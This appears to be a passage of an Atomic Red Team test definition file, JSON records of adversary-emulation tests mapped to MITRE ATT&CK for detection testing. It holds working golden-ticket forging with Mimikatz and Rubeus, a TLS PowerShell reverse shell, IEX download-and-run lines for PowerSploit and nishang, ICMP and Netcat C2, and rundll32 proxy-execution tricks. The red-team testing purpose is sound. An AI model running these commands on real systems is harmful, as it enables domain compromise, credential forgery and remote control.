				"description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID",
				"type": "string",
				"default": "S-1-5-21-DEFAULT"
			},
			"domain": {
				"description": "Targeted Active Directory domain FQDN",
				"type": "string",
				"default": "%userdnsdomain%"
			},
			"account": {
				"description": "Account to impersonate",
				"type": "string",
				"default": "goldenticketfakeuser"
			},
			"krbtgt_aes256_key": {
				"description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
				"type": "string",
				"default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
		},
		"attack_technique": "T1558.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Crafting Active Directory golden tickets with Rubeus",
		"auto_generated_guid": "e42d33cd-205c-4acf-ab59-a9f38f6bad9c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domaincontroller": {
				"description": "Targeted Active Directory domain FQDN",
				"type": "string",
				"default": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""
			},
			"account": {
				"description": "Account to impersonate",
				"type": "string",
				"default": "$ENV:username"
			},
			"krbtgt_aes256_key": {
				"description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
				"type": "string",
				"default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
			},
			"local_folder": {
				"description": "Local path of Rubeus executable",
				"type": "path",
				"default": "$Env:temp"
			},
			"local_executable": {
				"description": "name of the rubeus executable",
				"type": "string",
				"default": "rubeus.exe"
			},
			"rubeus_url": {
				"description": "URL of Rubeus executable",
				"type": "url",
				"default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			},
			{
				"description": "Rubeus must exist\n",
				"prereq_command": "if(Test-Path -Path #{local_folder}\\#{local_executable}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
		},
		"attack_technique": "T1558.001",
		"phases": ["credential-access"]
	},
	{
		"name": "OpenSSL C2",
		"auto_generated_guid": "21caf58e-87ad-440c-a6b8-3ac259964003",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"server_ip": {
				"description": "IP of the external server",
				"type": "string",
				"default": "127.0.0.1"
			},
			"server_port": {
				"description": "The port to connect to on the external server",
				"type": "string",
				"default": "443"
			}
		},
		"executor": {
			"command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1573",
		"phases": ["command-and-control"]
	},
	{
		"name": "ListCronjobs",
		"auto_generated_guid": "ddfb0bc1-3c3f-47e9-a298-550ecfefacbd",
		"supported_platforms": ["containers"],
		"input_arguments": {
			"namespace": {
				"description": "K8s namespace to list",
				"type": "string",
				"default": "default"
			}
		},
		"dependencies": [
			{
				"description": "kubectl must be installed\n",
				"get_prereq_command": "echo \"kubectl must be installed manually\"\n",
				"prereq_command": "which kubectl\n"
			}
		],
		"executor": {
			"command": "kubectl get cronjobs -n #{namespace}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1053.007",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "CreateCronjob",
		"auto_generated_guid": "f2fa019e-fb2a-4d28-9dc6-fd1a9b7f68c3",
		"supported_platforms": ["containers"],
		"input_arguments": {
			"namespace": {
				"description": "K8s namespace to list",
				"type": "string",
				"default": "default"
			}
		},
		"dependencies": [
			{
				"description": "kubectl must be installed\n",
				"get_prereq_command": "echo \"kubectl must be installed manually\"\n",
				"prereq_command": "which kubectl\n"
			}
		],
		"executor": {
			"command": "kubectl create -f src/cronjob.yaml -n #{namespace}\n",
			"cleanup_command": "kubectl delete cronjob art -n #{namespace}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1053.007",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Rundll32 execute JavaScript Remote Payload With GetObject",
		"auto_generated_guid": "57ba4ce9-ee7a-4f27-9928-3c70c489b59d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_url": {
				"description": "location of the payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"
			}
		},
		"executor": {
			"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n",
			"cleanup_command": "taskkill /IM notepad.exe /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 execute VBscript command",
		"auto_generated_guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Command for rundll32.exe to execute",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 execute VBscript command using Ordinal number",
		"auto_generated_guid": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Command for rundll32.exe to execute",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 advpack.dll Execution",
		"auto_generated_guid": "d91cae26-7fc1-457b-a854-34c8aad48c89",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_to_execute": {
				"description": "Local location of inf file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
				"prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "rundll32.exe advpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 ieadvpack.dll Execution",
		"auto_generated_guid": "5e46a58e-cbf6-45ef-a289-ed7754603df9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_to_execute": {
				"description": "Local location of inf file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
				"prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 syssetup.dll Execution",
		"auto_generated_guid": "41fa324a-3946-401e-bbdd-d7991c628125",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_to_execute": {
				"description": "Local location of inf file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
				"prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"#{inf_to_execute}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 setupapi.dll Execution",
		"auto_generated_guid": "71d771cd-d6b3-4f34-bc76-a63d47a10b19",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_to_execute": {
				"description": "Local location of inf file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
				"prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execution of HTA and VBS Files using Rundll32 and URL.dll",
		"auto_generated_guid": "22cfde89-befe-4e15-9753-47306b37a6e3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Launches an executable using Rundll32 and pcwutl.dll",
		"auto_generated_guid": "9f5d081a-ee5a-42f9-a04e-b7bdc487e676",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_to_launch": {
				"description": "Path of the executable to launch",
				"type": "path",
				"default": "%windir%\\System32\\notepad.exe"
			}
		},
		"executor": {
			"command": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execution of non-dll using rundll32.exe",
		"auto_generated_guid": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_url": {
				"description": "Url to download the DLL",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
			},
			"input_file": {
				"description": "Non-dll file",
				"type": "string",
				"default": "C:\\Users\\$env:username\\Downloads\\calc.png"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Non-dll file must exist on disk at specified location\n",
				"prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "rundll32.exe #{input_file}, StartW\n",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 with Ordinal Value",
		"auto_generated_guid": "9fd5a74b-ba89-482a-8a3e-a5feaa3697b0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_url": {
				"description": "Url to download the DLL",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll"
			},
			"input_file": {
				"description": "DLL File",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL file must exist on disk at specified location\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"command": "rundll32.exe \"#{input_file}\",#2\n",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 with Control_RunDLL",
		"auto_generated_guid": "e4c04b6f-c492-4782-82c7-3bf75eb8077e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_url": {
				"description": "Url to download the DLL",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
			},
			"input_file": {
				"description": "DLL File",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1047\\bin\\calc.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL file must exist on disk at specified location\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"command": "rundll32.exe shell32.dll,Control_RunDLL \"#{input_file}\"\n",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 with desk.cpl",
		"auto_generated_guid": "83a95136-a496-423c-81d3-1c6750133917",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_to_launch": {
				"description": "Path of the executable to launch",
				"type": "path",
				"default": "%windir%\\System32\\calc.exe"
			}
		},
		"executor": {
			"name": "command_prompt",
			"command": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n",
			"cleanup_command": "del not_an_scr.scr",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Running DLL with .init extension and function",
		"auto_generated_guid": "2d5029f0-ae20-446f-8811-e7511b58e8b6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_file": {
				"description": "The DLL file to be called",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.011\\bin\\_WT.init"
			},
			"dll_url": {
				"description": "The URL to the DLL file that must be downloaded",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The DLL file to be called must exist at the specified location (#{dll_file})",
				"prereq_command": "if (Test-Path \"#{dll_file}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{dll_url}\" -OutFile \"#{dll_file}\"\n"
			}
		],
		"executor": {
			"command": "rundll32.exe #{dll_file},krnl\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 execute command via FileProtocolHandler",
		"auto_generated_guid": "f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_to_execute": {
				"description": "Command for rundll32.exe to execute",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Rundll32 execute payload by calling RouteTheCall",
		"auto_generated_guid": "8a7f56ee-10e7-444c-a139-0109438288eb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_to_launch": {
				"description": "Path of the executable to launch",
				"type": "path",
				"default": "'%windir%\\System32\\calc.exe'"
			}
		},
		"executor": {
			"command": "rundll32.exe zipfldr.dll,RouteTheCall \"#{exe_to_launch}\"",
			"cleanup_command": null,
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.011",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Examine password complexity policy - Ubuntu",
		"auto_generated_guid": "085fe567-ac84-47c7-ac4c-2688ce28265b",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "cat /etc/pam.d/common-password\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine password complexity policy - FreeBSD",
		"auto_generated_guid": "a7893624-a3d7-4aed-9676-80498f31820f",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "cat /etc/pam.d/passwd\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine password complexity policy - CentOS/RHEL 7.x",
		"auto_generated_guid": "78a12e65-efff-4617-bc01-88f17d71315d",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "System must be CentOS or RHEL v7\n",
				"prereq_command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo Please run from CentOS or RHEL v7\n"
			}
		],
		"executor": {
			"command": "cat /etc/security/pwquality.conf\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine password complexity policy - CentOS/RHEL 6.x",
		"auto_generated_guid": "6ce12552-0adb-4f56-89ff-95ce268f6358",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "System must be CentOS or RHEL v6\n",
				"prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n",
				"get_prereq_command": "echo Please run from CentOS or RHEL v6\n"
			}
		],
		"executor": {
			"command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine password expiration policy - All Linux",
		"auto_generated_guid": "7c86c55c-70fa-4a05-83c9-3aa19b145d1a",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "cat /etc/login.defs\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine local password policy - Windows",
		"auto_generated_guid": "4588d243-f24e-4549-b2e3-e627acc089f6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net accounts\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine domain password policy - Windows",
		"auto_generated_guid": "46c2c362-2679-4ef5-aec9-0e958e135be4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net accounts /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine password policy - macOS",
		"auto_generated_guid": "4b7fa042-9482-45e1-b348-4b756b2a0742",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "pwpolicy getaccountpolicies",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainPolicy with PowerView",
		"auto_generated_guid": "3177f4da-3d4b-4592-8bdc-aa23d0b2e843",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy",
		"auto_generated_guid": "b2698b33-984c-4a1c-93bb-e4ba72a0babb",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "get-addefaultdomainpasswordpolicy\n"
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Use of SecEdit.exe to export the local security policy (including the password policy)",
		"auto_generated_guid": "510cc97f-56ac-4cd3-a198-d3218c23d889",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "Examine AWS Password Policy",
		"auto_generated_guid": "15330820-d405-450b-bd08-16b5be5be9f4",
		"supported_platforms": ["iaas:aws"],
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "aws iam get-account-password-policy\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1201",
		"phases": ["discovery"]
	},
	{
		"name": "ICMP C2",
		"auto_generated_guid": "0268e63c-e244-42db-bef7-72a9e59fc1fc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"server_ip": {
				"description": "The IP address of the listening server",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1095",
		"phases": ["command-and-control"]
	},
	{
		"name": "Netcat C2",
		"auto_generated_guid": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"server_port": {
				"description": "The port for the C2 connection",
				"type": "integer",
				"default": 80
			},
			"ncat_exe": {
				"description": "The location of ncat.exe",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe"
			},
			"ncat_path": {
